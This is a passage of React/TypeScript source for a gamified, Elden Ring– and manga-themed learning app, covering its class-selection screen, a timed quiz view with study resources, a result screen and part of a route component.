            onError={e => { (e.target as HTMLImageElement).style.display='none'; }}
          />
        </AnimatePresence>
        <div className="absolute inset-0" style={{ background:'linear-gradient(to top, #050402 20%, transparent 80%)' }} />
      </div>

      <div className="relative z-10 w-full max-w-5xl px-8 py-16">
        {/* Header */}
        <div className="text-center mb-16">
          <p style={{ fontFamily:"'Cinzel',serif", fontSize:'0.45rem', letterSpacing:'0.6em', color:'rgba(200,168,75,0.4)', textTransform:'uppercase', marginBottom:'0.75rem' }}>
            Ephemeral — Character Creation
          </p>
          <h1 style={{ fontFamily:"'Cinzel',serif", fontSize:'clamp(2rem,6vw,4rem)', fontWeight:700, color:'#C8A84B', letterSpacing:'0.1em', lineHeight:0.9 }}>
            CHOOSE YOUR<br />
            <span style={{ color:'white' }}>STARTING CLASS</span>
          </h1>
          <div className="er-rule mt-6 mx-auto" style={{ maxWidth:'300px' }} />
        </div>

        {/* Class display */}
        <div className="flex gap-12 items-start">
          {/* Selector dots */}
          <div className="flex flex-col gap-3 pt-8">
            {CHAR_CLASSES.map((c,i) => (
              <button key={c.id} onClick={() => setIdx(i)}
                className="w-2 h-2 rounded-full transition-all"
                style={{ background: idx===i ? c.col : 'rgba(200,168,75,0.15)',
                  boxShadow: idx===i ? `0 0 8px 2px ${c.col}60` : 'none' }} />
            ))}
          </div>

          {/* Main card */}
          <AnimatePresence mode="wait">
            <motion.div key={cls.id}
              initial={{ opacity:0, x:20 }} animate={{ opacity:1, x:0 }} exit={{ opacity:0, x:-20 }}
              transition={{ duration:0.35 }}
              className="flex-grow flex flex-col md:flex-row gap-10"
            >
              {/* Portrait */}
              <div className="flex-shrink-0">
                <div className="relative" style={{ width:'180px', height:'240px', border:`2px solid ${cls.col}40` }}>
                  <img src={cls.img} alt={cls.name}
                    className="w-full h-full object-cover"
                    style={{ filter:'sepia(30%) brightness(55%) contrast(120%)' }}
                    onError={e => { (e.target as HTMLImageElement).style.display='none'; }}
                  />
                  <div className="absolute inset-0" style={{ background:`linear-gradient(to top, ${cls.col}30, transparent 60%)` }} />
                  <div className="absolute bottom-3 left-3 text-2xl">{cls.icon}</div>
                </div>
                <p style={{ fontFamily:"'IBM Plex Mono',monospace", fontSize:'0.42rem', color:`${cls.col}80`, letterSpacing:'0.15em', textTransform:'uppercase', marginTop:'0.5rem', textAlign:'center' }}>
                  {cls.manga}
                </p>
              </div>

              {/* Info */}
              <div className="flex-grow">
                <p style={{ fontFamily:"'Cinzel',serif", fontSize:'0.45rem', letterSpacing:'0.5em', color:`${cls.col}`, textTransform:'uppercase', marginBottom:'0.3rem' }}>
                  Starting Class
                </p>
                <h2 style={{ fontFamily:"'Cinzel',serif", fontSize:'clamp(1.5rem,4vw,2.5rem)', fontWeight:700, color:'white', letterSpacing:'0.08em', textTransform:'uppercase', lineHeight:1, marginBottom:'0.3rem' }}>
                  {cls.name}
                </h2>
                <p style={{ fontFamily:"'Cormorant Garamond',serif", fontStyle:'italic', fontSize:'0.85rem', color:'rgba(200,168,75,0.45)', marginBottom:'1.2rem', letterSpacing:'0.05em' }}>
                  "{cls.epithet}"
                </p>

                <div className="er-rule mb-6" />

                <p style={{ fontFamily:"'Cormorant Garamond',serif", fontSize:'0.9rem', color:'rgba(255,255,255,0.5)', lineHeight:1.75, fontStyle:'italic', marginBottom:'1.5rem', maxWidth:'420px' }}>
                  {cls.desc}
                </p>

                {/* Stats bars */}
                <div className="space-y-3 mb-8">
                  {cls.stats.map(s => (
                    <div key={s.label} className="flex items-center gap-4">
                      <span style={{ fontFamily:"'IBM Plex Mono',monospace", fontSize:'0.45rem', color:'rgba(200,168,75,0.4)', letterSpacing:'0.2em', textTransform:'uppercase', minWidth:'70px' }}>
                        {s.label}
                      </span>
                      <div className="flex gap-1">
                        {Array.from({length:5},(_,i)=>(
                          <div key={i} className="w-6 h-2"
                            style={{ background: i < s.val ? cls.col : 'rgba(200,168,75,0.1)' }} />
                        ))}
                      </div>
                    </div>
                  ))}
                </div>

                <div className="flex gap-4 items-center">
                  <button
                    onClick={() => { setConfirmed(true); setTimeout(() => onSelect(cls), 1000); }}
                    disabled={confirmed}
                    className="px-12 py-4 font-bold uppercase tracking-widest transition-all"
                    style={{ background: confirmed ? 'rgba(200,168,75,0.2)' : cls.col,
                      color: confirmed ? cls.col : '#050402',
                      fontFamily:"'Cinzel',serif", fontSize:'0.65rem', letterSpacing:'0.3em',
                      border: confirmed ? `1px solid ${cls.col}` : 'none', cursor: confirmed ? 'not-allowed' : 'pointer' }}>
                    {confirmed ? '✦ GRACE ACCEPTED' : 'BEGIN AS THIS CLASS'}
                  </button>
                  <div className="flex gap-4">
                    <button onClick={() => setIdx(i => (i-1+CHAR_CLASSES.length)%CHAR_CLASSES.length)}
                      style={{ background:'none', border:`1px solid rgba(200,168,75,0.2)`, color:'rgba(200,168,75,0.5)', fontFamily:"'Cinzel',serif", fontSize:'0.6rem', padding:'0.6rem 1rem', cursor:'pointer' }}>
                      ←
                    </button>
                    <button onClick={() => setIdx(i => (i+1)%CHAR_CLASSES.length)}
                      style={{ background:'none', border:`1px solid rgba(200,168,75,0.2)`, color:'rgba(200,168,75,0.5)', fontFamily:"'Cinzel',serif", fontSize:'0.6rem', padding:'0.6rem 1rem', cursor:'pointer' }}>
                      →
                    </button>
                  </div>
                </div>

                <p style={{ fontFamily:"'IBM Plex Mono',monospace", fontSize:'0.38rem', color:'rgba(200,168,75,0.2)', letterSpacing:'0.25em', textTransform:'uppercase', marginTop:'0.75rem' }}>
                  ← → Navigate · Enter Select
                </p>
              </div>
            </motion.div>
          </AnimatePresence>
        </div>

        {/* Bottom class strip */}
        <div className="flex justify-center gap-3 mt-12 flex-wrap">
          {CHAR_CLASSES.map((c,i) => (
            <button key={c.id} onClick={() => setIdx(i)}
              className="px-4 py-2 transition-all"
              style={{ fontFamily:"'Cinzel',serif", fontSize:'0.45rem', letterSpacing:'0.2em', textTransform:'uppercase',
                background: idx===i ? `${c.col}18` : 'transparent',
                border: `1px solid ${idx===i ? c.col : 'rgba(200,168,75,0.1)'}`,
                color: idx===i ? c.col : 'rgba(200,168,75,0.3)', cursor:'pointer' }}>
              {c.name}
            </button>
          ))}
        </div>
      </div>
    </div>
  );
};

// ─────────────────────────────────────────────
// RESULT SCREEN — YOU DIED / SITE OF GRACE
// ─────────────────────────────────────────────
const ResultScreen = ({ domain, episode, score, total, xpEarned, onRetry, onContinue, onBack }: {
  domain: Domain; episode: Episode;
  score: number; total: number; xpEarned: number;
  onRetry: () => void; onContinue: () => void; onBack: () => void;
}) => {
  const pct = Math.round((score / total) * 100);
  const passed = score >= Math.ceil(total * 0.6);
  const perfect = score === total;
  const [phase, setPhase] = useState<'verdict'|'detail'>('verdict');

  useEffect(() => {
    const t = setTimeout(() => setPhase('detail'), perfect ? 2200 : passed ? 2000 : 2400);
    return () => clearTimeout(t);
  }, []);

  const VERDICT = perfect
    ? { text: 'SITE OF GRACE', sub: 'Strength granted by grace — you embody the Golden Order', col: '#F0D07A', colDim:'#8B6914' }
    : passed
    ? { text: 'ARC CLEARED', sub: `${score}/${total} — Knowledge grows like ember in ash`, col: '#C8A84B', colDim:'#6B5014' }
    : { text: 'YOU DIED', sub: 'Death is not an end. Rise, Tarnished — the path remains', col: '#FF4D00', colDim:'#6B1500' };

  const FLAVOUR: Record<number,string> = {
    3: '"The accumulation of small, boring efforts — that\'s the only real secret." — Saitama',
    2: '"Even if I must challenge the darkness, I will never give up." — Guts',
    1: '"There is no shame in failure. There is shame in not trying again." — Thorfinn',
    0: '"The weak are meat — the strong eat." — Griffith',
  };
  const flavourKey = score >= total ? 3 : score >= total*0.7 ? 2 : score >= total*0.4 ? 1 : 0;

  return (
    <div className="fixed inset-0 z-[200] flex flex-col items-center justify-center overflow-hidden"
      style={{ background:'#050402' }}>
      <EmberParticles />

      {/* Background manga art */}
      <div className="absolute inset-0 z-0">
        <img src={domain.image} alt="" className="w-full h-full object-cover opacity-10 mix-blend-screen"
          style={{ filter:'sepia(60%) contrast(150%) brightness(40%)' }}
          onError={e => { (e.target as HTMLImageElement).style.display='none'; }} />
        <div className="absolute inset-0" style={{ background:`radial-gradient(ellipse at 50% 50%, ${VERDICT.colDim}20, #050402 70%)` }} />
      </div>

      {/* Verdict phase */}
      <AnimatePresence>
        {phase === 'verdict' && (
          <motion.div key="verdict"
            initial={{ opacity:0, scale:1.3 }} animate={{ opacity:1, scale:1 }} exit={{ opacity:0, scale:0.9 }}
            transition={{ duration:0.8, ease:'easeOut' }}
            className="absolute inset-0 flex flex-col items-center justify-center z-10"
          >
            <motion.h1
              initial={{ opacity:0, y:20 }} animate={{ opacity:1, y:0 }} transition={{ delay:0.3, duration:1 }}
              style={{ fontFamily:"'Cinzel',serif", fontSize:'clamp(4rem,15vw,9rem)', fontWeight:700,
                letterSpacing:'0.15em', color:VERDICT.col, lineHeight:0.85, textTransform:'uppercase',
                textShadow:`0 0 80px ${VERDICT.col}50, 0 0 160px ${VERDICT.col}20` }}
            >
              {VERDICT.text}
            </motion.h1>
            <motion.p
              initial={{ opacity:0 }} animate={{ opacity:1 }} transition={{ delay:0.9, duration:0.8 }}
              style={{ fontFamily:"'Cormorant Garamond',serif", fontStyle:'italic', fontSize:'1rem',
                color:'rgba(200,168,75,0.45)', letterSpacing:'0.1em', marginTop:'1rem', textAlign:'center' }}>
              {VERDICT.sub}
            </motion.p>

            {/* Rune ornament */}
            <motion.div initial={{ opacity:0, scaleX:0 }} animate={{ opacity:1, scaleX:1 }}
              transition={{ delay:1.2, duration:0.8 }}
              className="flex items-center gap-4 mt-8">
              <div style={{ height:'1px', width:'80px', background:`linear-gradient(to right, transparent, ${VERDICT.col})` }} />
              <span style={{ color:VERDICT.col, fontSize:'1rem' }}>✦</span>
              <div style={{ height:'1px', width:'80px', background:`linear-gradient(to left, transparent, ${VERDICT.col})` }} />
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>

      {/* Detail phase */}
      <AnimatePresence>
        {phase === 'detail' && (
          <motion.div key="detail"
            initial={{ opacity:0 }} animate={{ opacity:1 }} transition={{ duration:0.8 }}
            className="relative z-10 w-full max-w-2xl px-8 text-center"
          >
            {/* Score */}
            <div className="mb-8">
              <div style={{ fontFamily:"'Cinzel',serif", fontSize:'clamp(4rem,12vw,7rem)', fontWeight:700,
                color:VERDICT.col, lineHeight:0.85, letterSpacing:'0.08em',
                textShadow:`0 0 40px ${VERDICT.col}40` }}>
                {pct}%
              </div>
              <p style={{ fontFamily:"'IBM Plex Mono',monospace", fontSize:'0.55rem', color:'rgba(200,168,75,0.35)',
                letterSpacing:'0.3em', textTransform:'uppercase', marginTop:'0.4rem' }}>
                {score} OF {total} TRIALS CLEARED
              </p>
            </div>

            {/* XP earned */}
            <motion.div initial={{ opacity:0, y:10 }} animate={{ opacity:1, y:0 }} transition={{ delay:0.3 }}
              className="mb-8 py-5 border-y" style={{ borderColor:'rgba(200,168,75,0.15)' }}>
              <p style={{ fontFamily:"'Cinzel',serif", fontSize:'0.45rem', letterSpacing:'0.5em',
                color:'rgba(200,168,75,0.4)', textTransform:'uppercase', marginBottom:'0.4rem' }}>
                Bounty Earned
              </p>
              <div style={{ fontFamily:"'Cinzel',serif", fontSize:'2.5rem', fontWeight:700, color:'#C8A84B', lineHeight:1 }}>
                +¥{xpEarned.toLocaleString()}
              </div>
              <p style={{ fontFamily:"'Cormorant Garamond',serif", fontStyle:'italic', fontSize:'0.7rem',
                color:'rgba(200,168,75,0.3)', marginTop:'0.25rem' }}>
                {episode.t} · {domain.name}
              </p>
            </motion.div>

            {/* Flavour quote */}
            <motion.p initial={{ opacity:0 }} animate={{ opacity:1 }} transition={{ delay:0.5 }}
              style={{ fontFamily:"'Cormorant Garamond',serif", fontStyle:'italic', fontSize:'0.8rem',
                color:'rgba(255,255,255,0.3)', lineHeight:1.7, marginBottom:'2rem', maxWidth:'480px', margin:'0 auto 2rem' }}>
              {FLAVOUR[flavourKey]}
            </motion.p>

            {/* Answer breakdown */}
            {score < total && (
              <motion.div initial={{ opacity:0 }} animate={{ opacity:1 }} transition={{ delay:0.6 }}
                className="mb-8 text-left p-5 border" style={{ borderColor:'rgba(200,168,75,0.1)', background:'rgba(200,168,75,0.03)' }}>
                <p style={{ fontFamily:"'Cinzel',serif", fontSize:'0.4rem', letterSpacing:'0.4em', color:'rgba(200,168,75,0.4)', textTransform:'uppercase', marginBottom:'0.5rem' }}>
                  Recommended Scrolls
                </p>
                <p style={{ fontFamily:"'Cormorant Garamond',serif", fontStyle:'italic', fontSize:'0.75rem', color:'rgba(255,255,255,0.4)', lineHeight:1.65 }}>
                  Return to the Scrolls of Knowledge and revisit the concepts where you faltered. Every missed question is a locked door — the key is in the resources provided before the Gauntlet.
                </p>
              </motion.div>
            )}

            {/* Actions */}
            <motion.div initial={{ opacity:0, y:10 }} animate={{ opacity:1, y:0 }} transition={{ delay:0.7 }}
              className="flex flex-col sm:flex-row gap-4 justify-center">
              {!passed && (
                <button onClick={onRetry}
                  className="px-10 py-4 transition-all hover:scale-105"
                  style={{ background:`${VERDICT.col}18`, border:`2px solid ${VERDICT.col}`,
                    color:VERDICT.col, fontFamily:"'Cinzel',serif", fontSize:'0.6rem',
                    letterSpacing:'0.3em', textTransform:'uppercase', cursor:'pointer' }}>
                  ↺ Rise Again
                </button>
              )}
              <button onClick={onContinue}
                className="px-12 py-4 transition-all hover:scale-105"
                style={{ background:VERDICT.col, color:'#050402',
                  fontFamily:"'Cinzel',serif", fontSize:'0.6rem',
                  letterSpacing:'0.3em', textTransform:'uppercase',
                  border:'none', cursor:'pointer',
                  boxShadow:`0 8px 30px ${VERDICT.col}40` }}>
                {passed ? '→ Next Battle' : 'Study Scrolls'}
              </button>
              <button onClick={onBack}
                className="px-8 py-4 transition-all"
                style={{ background:'transparent', border:'1px solid rgba(200,168,75,0.2)',
                  color:'rgba(200,168,75,0.4)', fontFamily:"'Cinzel',serif", fontSize:'0.55rem',
                  letterSpacing:'0.25em', textTransform:'uppercase', cursor:'pointer' }}>
                Arc Overview
              </button>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  );
};

// ─────────────────────────────────────────────
// CHALLENGE VIEW
// ─────────────────────────────────────────────
const ChallengeView = ({ domain, episode, onBack, onComplete }: {
  domain: Domain; episode: Episode; onBack: () => void;
  onComplete: (score: number) => void;
}) => {
  const [tab, setTab] = useState<'BRIEF' | 'SCROLLS' | 'GAUNTLET'>('BRIEF');
  const [currentQ, setCurrentQ] = useState(0);
  const [answers, setAnswers] = useState<Record<number, number>>({});
  const [reviewed, setReviewed] = useState<Record<number, boolean>>({});
  const [score, setScore] = useState(0);
  const [timer, setTimer] = useState(720);
  const [showResult, setShowResult] = useState(false);
  const [finalScore, setFinalScore] = useState(0);

  const qs = QUESTIONS[domain.id] || QUESTIONS['t4_oracle'];

  useEffect(() => {
    if (tab !== 'GAUNTLET') return;
    const iv = setInterval(() => setTimer(t => {
      if (t <= 1) { clearInterval(iv); finishGauntlet(); return 0; }
      return t - 1;
    }), 1000);
    return () => clearInterval(iv);
  }, [tab]);

  const finishGauntlet = () => {
    setFinalScore(score);
    setShowResult(true);
  };

  const pick = (j: number) => {
    if (reviewed[currentQ]) return;
    setAnswers({ ...answers, [currentQ]: j });
    setReviewed({ ...reviewed, [currentQ]: true });
    if (j === qs[currentQ].ans) setScore(s => s + 1);
  };

  const next = () => {
    if (currentQ < qs.length - 1) { setCurrentQ(c => c + 1); }
    else { finishGauntlet(); }
  };

  if (showResult) return (
    <ResultScreen
      domain={domain} episode={episode}
      score={finalScore} total={qs.length}
      xpEarned={Math.round((finalScore / qs.length) * episode.xp)}
      onRetry={() => { setShowResult(false); setCurrentQ(0); setAnswers({}); setReviewed({}); setScore(0); setFinalScore(0); setTimer(720); setTab('GAUNTLET'); }}
      onContinue={() => { onComplete(finalScore); }}
      onBack={onBack}
    />
  );

  return (
    <div className="max-w-5xl mx-auto py-20 px-8 min-h-screen">
      <button onClick={onBack} className="flex items-center gap-2 mb-12 transition-colors text-white/30 hover:text-white" style={{ fontFamily: "'IBM Plex Mono', monospace", fontSize: '0.6rem', letterSpacing: '0.15em', textTransform: 'uppercase', background: 'none', border: 'none', cursor: 'pointer' }}>
        <ChevronLeft className="w-4 h-4" /> Back to Arc
      </button>

      {/* Header */}
      <div className="mb-12">
        <div className="flex items-center gap-4 mb-4">
          <span className="px-3 py-1 text-xs font-mono font-bold border" style={{ borderColor: domain.col + '50', color: domain.col, fontSize: '0.45rem', letterSpacing: '0.3em', textTransform: 'uppercase', fontFamily: "'IBM Plex Mono', monospace" }}>
            {domain.cat}
          </span>
          <span style={{ fontFamily: "'IBM Plex Mono', monospace", fontSize: '0.45rem', color: 'rgba(255,255,255,0.3)', letterSpacing: '0.15em', textTransform: 'uppercase' }}>
            BATTLE {String(episode.n).padStart(2,'0')}
          </span>
        </div>
        <h1 style={{ fontFamily: "'Cinzel', serif", fontSize: 'clamp(1.5rem,4vw,3rem)', fontWeight: 700, letterSpacing: '0.05em', lineHeight: 1, textTransform: 'uppercase' }}>
          {episode.t}
        </h1>
        <p style={{ fontFamily: "'Cormorant Garamond', serif", fontStyle: 'italic', color: 'rgba(255,255,255,0.35)', fontSize: '0.85rem', marginTop: '0.4rem', letterSpacing: '0.05em' }}>
          {domain.name} · {domain.manga}
        </p>
      </div>

      {/* Tabs */}
      <div className="flex border-b border-white/10 mb-12 overflow-x-auto">
        {(['BRIEF','SCROLLS','GAUNTLET'] as const).map((t, i) => (
          <button key={t} onClick={() => setTab(t)}
            className="px-10 py-5 text-xs font-mono uppercase font-bold tracking-widest transition-all whitespace-nowrap border-b-2"
            style={{
              fontFamily: "'Cinzel', serif", fontSize: '0.55rem', letterSpacing: '0.25em',
              color: tab === t ? '#C8A84B' : 'rgba(255,255,255,0.3)',
              borderBottomColor: tab === t ? '#C8A84B' : 'transparent',
              background: 'none', cursor: 'pointer',
            }}>
            0{i+1}_{t}
          </button>
        ))}
      </div>

      <AnimatePresence mode="wait">
        {/* BRIEF */}
        {tab === 'BRIEF' && (
          <motion.div key="brief" initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0 }} className="space-y-12">
            <div className="border-l-4 p-10 relative overflow-hidden" style={{ borderColor: domain.col, background: 'rgba(255,255,255,0.03)' }}>
              <span style={{ fontFamily: "'Cinzel', serif", fontSize: '0.4rem', letterSpacing: '0.5em', color: domain.col, textTransform: 'uppercase', display: 'block', marginBottom: '0.75rem' }}>
                Admiral's Transmission — Priority Alpha
              </span>
              <p style={{ fontFamily: "'Cormorant Garamond', serif", fontSize: '1.4rem', fontStyle: 'italic', color: 'rgba(255,255,255,0.85)', lineHeight: 1.4 }}>
                "{episode.d}"
              </p>
            </div>
            {episode.tags && (
              <div>
                <p style={{ fontFamily: "'Cinzel', serif", fontSize: '0.4rem', letterSpacing: '0.5em', color: 'rgba(255,255,255,0.2)', textTransform: 'uppercase', marginBottom: '0.75rem' }}>
                  Battle Skills
                </p>
                <div className="flex gap-3 flex-wrap">
                  {episode.tags.map(tag => (
                    <span key={tag} className="px-3 py-1 border text-xs font-mono uppercase tracking-widest"
                      style={{ borderColor: domain.col + '30', color: domain.col + 'AA', fontSize: '0.5rem', letterSpacing: '0.2em' }}>{tag}</span>
                  ))}
                </div>
              </div>
            )}
            <button onClick={() => setTab('SCROLLS')}
              className="w-full py-6 font-black text-xl uppercase tracking-tighter transition-all"
              style={{ background: domain.col, color: '#050402', fontFamily: "'Cinzel', serif", fontSize: '0.8rem', letterSpacing: '0.2em', border: 'none', cursor: 'pointer' }}>
              Study The Scrolls →
            </button>
          </motion.div>
        )}

        {/* SCROLLS */}
        {tab === 'SCROLLS' && (
          <motion.div key="scrolls" initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0 }} className="space-y-6">
            {(episode.resources || [
              { t: `${episode.t} — Core Concepts`, s: 'EPHEMERAL LOGS', d: episode.d, code: `# Tier ${episode.n} — ${domain.name}\n# XP: ${episode.xp} · Time: ${episode.min}min\n\ndef study(scrolls):\n  return mastery`, url: `https://www.google.com/search?q=${encodeURIComponent(episode.t)}` },
              { t: 'Applied Implementation', s: 'PRACTICE GROUNDS', d: 'Real examples from production systems.', code: `implementation = apply(\n  theory=concepts,\n  context='production'\n)`, url: `https://github.com/search?q=${encodeURIComponent(episode.t)}` },
            ]).map((r, i) => (
              <div key={i} onClick={() => window.open(r.url, '_blank')}
                className="flex gap-6 border border-white/5 bg-void-dark hover:border-white/20 cursor-pointer transition-all group">
                <div className="p-6">
                  <div className="w-10 h-10 flex items-center justify-center mb-4 border border-white/10 group-hover:border-white/30 transition-all" style={{ color: domain.col }}>
                    {i === 0 ? <BookOpen className="w-5 h-5" /> : <ExternalLink className="w-5 h-5" />}
                  </div>
                  <h4 className="font-black uppercase tracking-tight mb-1" style={{ fontFamily: "'Cinzel', serif", fontSize: '0.75rem', color: 'white' }}>{r.t}</h4>
                  <p style={{ fontFamily: "'IBM Plex Mono', monospace", fontSize: '0.4rem', color: 'rgba(255,255,255,0.3)', letterSpacing: '0.2em', textTransform: 'uppercase' }}>{r.s}</p>
                  <p style={{ fontFamily: "'Cormorant Garamond', serif", fontStyle: 'italic', fontSize: '0.75rem', color: 'rgba(255,255,255,0.4)', marginTop: '0.4rem', lineHeight: 1.5 }}>{r.d}</p>
                </div>
                <pre className="p-6 border-l border-white/5 flex-grow bg-black/40 overflow-auto text-xs leading-relaxed" style={{ fontFamily: "'IBM Plex Mono', monospace", fontSize: '0.55rem', color: domain.col, opacity: 0.7 }}>
                  {r.code}
                </pre>
              </div>
            ))}
            <button onClick={() => setTab('GAUNTLET')}
              className="w-full py-6 font-black uppercase tracking-tighter transition-all hover:scale-[1.01] active:scale-[0.99]"
              style={{ background: domain.col, color: '#050402', fontFamily: "'Cinzel', serif", fontSize: '0.8rem', letterSpacing: '0.2em', border: 'none', cursor: 'pointer' }}>
              Enter The Gauntlet →
            </button>
          </motion.div>
        )}

        {/* GAUNTLET */}
        {tab === 'GAUNTLET' && (
          <motion.div key="gauntlet" initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }} className="space-y-10">
            <div className="flex justify-between items-center p-8 border border-white/10 bg-void-dark">
              <div>
                <p style={{ fontFamily: "'Cinzel', serif", fontSize: '0.4rem', letterSpacing: '0.5em', color: domain.col, textTransform: 'uppercase', marginBottom: '0.3rem' }}>
                  Trial {currentQ + 1} of {qs.length}
                </p>
                <p style={{ fontFamily: "'Cinzel', serif", fontSize: '0.75rem', color: 'white' }}>
                  Score: <span style={{ color: domain.col }}>{score}</span> / {qs.length}
                </p>
              </div>
              <div style={{ fontFamily: "'Cinzel', serif", fontSize: '2rem', fontWeight: 700, color: timer < 60 ? '#FF4D00' : '#C8A84B', letterSpacing: '0.1em' }}>
                {Math.floor(timer / 60)}:{String(timer % 60).padStart(2, '0')}
              </div>
            </div>

            {/* Progress */}
            <div className="h-[2px]" style={{ background: 'rgba(255,255,255,0.05)' }}>
              <div className="h-full transition-all" style={{ width: `${(currentQ / qs.length) * 100}%`, background: domain.col }} />
            </div>

            <h2 style={{ fontFamily: "'Cinzel', serif", fontSize: 'clamp(1rem,3vw,1.5rem)', fontWeight: 700, color: 'white', lineHeight: 1.3, textTransform: 'uppercase', letterSpacing: '0.03em' }}>
              {qs[currentQ].q}
            </h2>

            <div className="grid gap-4">
              {qs[currentQ].opts.map((opt, i) => {
                const isRev = reviewed[currentQ];
                const isSel = answers[currentQ] === i;
                const isRight = i === qs[currentQ].ans;
                let border = 'rgba(255,255,255,0.07)';
                let col = 'rgba(255,255,255,0.5)';
                let bg = 'rgba(255,255,255,0.02)';
                if (isRev && isRight) { border = domain.col; col = domain.col; bg = domain.col + '10'; }
                else if (isRev && isSel && !isRight) { border = '#FF4D00'; col = '#FF4D00'; bg = 'rgba(255,77,0,0.05)'; }
                else if (!isRev && isSel) { border = 'white'; col = 'white'; bg = 'rgba(255,255,255,0.05)'; }
                return (
                  <button key={i} disabled={isRev} onClick={() => pick(i)}
                    className="p-6 text-left flex items-center gap-6 transition-all"
                    style={{ border: `2px solid ${border}`, background: bg, cursor: isRev ? 'default' : 'pointer' }}>
                    <span style={{ fontFamily: "'Cinzel', serif", fontSize: '0.8rem', color, opacity: 0.4 }}>0{i+1}</span>
                    <span style={{ fontFamily: "'Cinzel', serif", fontSize: '0.75rem', color, textTransform: 'uppercase', letterSpacing: '0.05em', fontWeight: 600 }}>{opt}</span>
                    {isRev && isRight && <CheckCircle2 className="w-5 h-5 ml-auto" style={{ color: domain.col }} />}
                  </button>
                );
              })}
            </div>

            {reviewed[currentQ] && (
              <motion.div initial={{ opacity: 0, x: -10 }} animate={{ opacity: 1, x: 0 }}
                className="p-8 border-l-4" style={{ borderColor: domain.col, background: 'rgba(255,255,255,0.03)' }}>
                <p style={{ fontFamily: "'Cinzel', serif", fontSize: '0.4rem', letterSpacing: '0.5em', color: domain.col, textTransform: 'uppercase', marginBottom: '0.5rem' }}>
                  Nakama's Notes
                </p>
                <p style={{ fontFamily: "'Cormorant Garamond', serif", fontStyle: 'italic', color: 'rgba(255,255,255,0.5)', fontSize: '0.9rem', lineHeight: 1.6 }}>
                  {qs[currentQ].ex}
                </p>
              </motion.div>
            )}

            <div className="flex justify-end">
              <button onClick={next} disabled={!reviewed[currentQ]}
                className="px-12 py-5 font-black uppercase tracking-tight transition-all disabled:opacity-20"
                style={{ background: reviewed[currentQ] ? domain.col : 'rgba(255,255,255,0.1)', color: '#050402', fontFamily: "'Cinzel', serif", fontSize: '0.7rem', letterSpacing: '0.2em', border: 'none', cursor: reviewed[currentQ] ? 'pointer' : 'not-allowed' }}>
                {currentQ === qs.length - 1 ? 'Complete ✓' : 'Next Trial →'}
              </button>
            </div>
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  );
};

// ─────────────────────────────────────────────
// SERIES ROUTE
// ─────────────────────────────────────────────
const SeriesRoute = ({ xp, setXp }: { xp: number; setXp: React.Dispatch<React.SetStateAction<number>> }) => {
  const navigate = useNavigate();
  const location = useLocation();
  const domainId = location.pathname.split('/')[2] || 't0_village';
  const domain = DOMAINS[domainId];
  const [activeArc, setActiveArc] = useState(1);
  const [activeEpIdx, setActiveEpIdx] = useState<number | null>(null);

  if (!domain) return <Navigate to="/" />;

  const activeEp = activeEpIdx !== null ? (domain.eps[activeArc] || [])[activeEpIdx] : null;

  if (activeEp) {
    return (
      <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }}>
        <ChallengeView
          domain={domain} episode={activeEp}
          onBack={() => setActiveEpIdx(null)}
          onComplete={s => { setXp(x => x + s * 80); setActiveEpIdx(null); }}
        />
      </motion.div>
    );
  }

  return (
    <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="pb-24 max-w-7xl mx-auto">
      {/* Hero */}
      <div className="relative overflow-hidden mb-0" style={{ height: '320px', background: domain.bg }}>
        <img src={domain.image} alt={domain.name}
          className="absolute inset-0 w-full h-full object-cover opacity-20 mix-blend-screen"
          style={{ filter: 'sepia(40%) contrast(120%) brightness(60%)' }}
          onError={e => { (e.target as HTMLImageElement).style.display = 'none'; }}
        />
        <div className="absolute inset-0" style={{ background: 'linear-gradient(to top, #0A0A0A 0%, transparent 60%), linear-gradient(to right, #0A0A0A 30%, transparent 70%)' }} />
        <EmberParticles />
        <div className="absolute bottom-0 left-0 p-10 z-10">
          <p style={{ fontFamily: "'Cinzel', serif", fontSize: '0.45rem', letterSpacing: '0.5em', color: domain.col, textTransform: 'uppercase', marginBottom: '0.5rem', opacity: 0.7 }}>
            TIER {domain.tier} · {domain.cat}
          </p>
          <h1 style={{ fontFamily: "'Cinzel', serif", fontSize: 'clamp(2rem,6vw,4.5rem)', fontWeight: 700, color: 'white', letterSpacing: '0.08em', lineHeight: 0.9, textTransform: 'uppercase' }}>
            {domain.name}
          </h1>
          <p style={{ fontFamily: "'Cormorant Garamond', serif", fontStyle: 'italic', color: 'rgba(255,255,255,0.4)', fontSize: '0.85rem', marginTop: '0.5rem' }}>
            {domain.manga}
          </p>
          <div className="flex gap-4 mt-4">
            {[
              { label: `${domain.prog}% CLEAR`, col: domain.col },
              { label: `${domain.arcs} ARCS`, col: 'rgba(255,255,255,0.3)' },
              { label: `${domain.battles} BATTLES`, col: 'rgba(255,255,255,0.3)' },
            ].map(b => (
              <span key={b.label} className="px-3 py-1 border text-xs font-mono uppercase tracking-widest"
                style={{ borderColor: b.col + '40', color: b.col, fontSize: '0.42rem', letterSpacing: '0.25em', fontFamily: "'IBM Plex Mono', monospace" }}>{b.label}</span>
            ))}
          </div>
        </div>
      </div>

      {/* Arc selector */}
      <div className="flex gap-4 px-8 py-5 border-b border-white/5 bg-void-dark overflow-x-auto">
        {[domain.s1, domain.s2, domain.s3].filter(Boolean).map((s, i) => (
          <button key={s} onClick={() => setActiveArc(i + 1)}
            className="flex-shrink-0 px-8 py-3 border-2 text-xs font-mono uppercase font-bold tracking-widest transition-all"
            style={{
              fontFamily: "'Cinzel', serif", fontSize: '0.5rem', letterSpacing: '0.2em',
              borderColor: activeArc === i + 1 ? domain.col : 'rgba(255,255,255,0.08)',
              color: activeArc === i + 1 ? domain.col : 'rgba(255,255,255,0.2)',
              background: activeArc === i + 1 ? domain.col + '10' : 'transparent',
              cursor: 'pointer',
            }}>
            {s}
          </button>
        ))}
      </div>

      {/* World Map — shown on first arc view */}
      {activeArc === 1 && (
        <div className="px-8 pt-8 pb-0">
          <WorldMap onSelectTier={id => navigate(`/series/${id}`)} />
        </div>
      )}

      {/* Episodes */}
      <div className="px-8 py-8 flex flex-col gap-4">
